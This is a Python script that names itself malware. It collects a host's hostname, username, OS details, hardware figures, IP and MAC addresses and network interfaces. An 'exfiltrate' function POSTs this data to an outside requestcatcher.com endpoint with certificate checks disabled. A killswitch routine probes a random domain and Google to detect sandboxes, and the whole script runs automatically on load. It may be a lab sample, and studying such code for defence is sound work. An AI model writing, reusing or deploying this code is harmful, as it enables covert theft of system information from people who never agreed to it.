# --- IMPORTS ---
import platform
import socket
import getpass
import uuid
import psutil
import json
import requests
import os
import time
import sys
import random
import string
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

activate_killswitch = False

def killswitch():
    if activate_killswitch:
        url = ''.join(random.choices(string.ascii_letters + string.digits, k=40)) + ".com"
        try:
            request_random = requests.get(url)
            if request_random.status_code == 200:
                return True
        except requests.exceptions.RequestException:
            pass
        try:
            request_google = requests.get("https://www.google.com")
            if request_google.status_code == 200:
                return False
            else:
                return True
        except requests.exceptions.RequestException:
            return True
    else : 
        return False

def get_system_info():
    info = {}
    info['malware_id'] = "Feeling-Ray-sponsible"
    info['hostname'] = socket.gethostname()
    info['username'] = getpass.getuser()
    info['platform'] = platform.system()
    info['platform-release'] = platform.release()
    info['platform-version'] = platform.version()
    info['architecture'] = platform.architecture()[0]
    info['uptime_seconds'] = time.time() - psutil.boot_time()
    info['cpu'] = platform.processor()
    info['cores_logical'] = psutil.cpu_count()
    info['cores_physical'] = psutil.cpu_count(logical=False)
    info['ram_total_MB'] = round(psutil.virtual_memory().total / (1024 * 1024), 2)
    try:
        info['ip_address'] = socket.gethostbyname(socket.gethostname())
    except:
        info['ip_address'] = "N/A"
    try:
        info['mac_address'] = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                                        for ele in range(0, 8 * 6, 8)][::-1])
    except:
        info['mac_address'] = "N/A"
    net_info = {}
    for interface, addrs in psutil.net_if_addrs().items():
        net_info[interface] = [addr.address for addr in addrs if addr.family == socket.AF_INET]
    info['network_interfaces'] = net_info
    return info

def exfiltrate(data):
    try:
        headers = {'Content-Type': 'application/json'}
        response = requests.post("https://shoubadidou.requestcatcher.com/", data=json.dumps(data), headers=headers, timeout=5, verify=False)
        return response.status_code
    except Exception as e:
        return f"Exfiltration error: {e}"

def main():
    system_data = get_system_info()
    result = exfiltrate(system_data)
    # Optionnel : log local ou debug
    # print(result)

def start_manta():
    system_data = get_system_info()
    result = exfiltrate(system_data)
    # Optionnel : log local ou debug
    # print(result)

if killswitch():
    sys.exit()
else:
    main()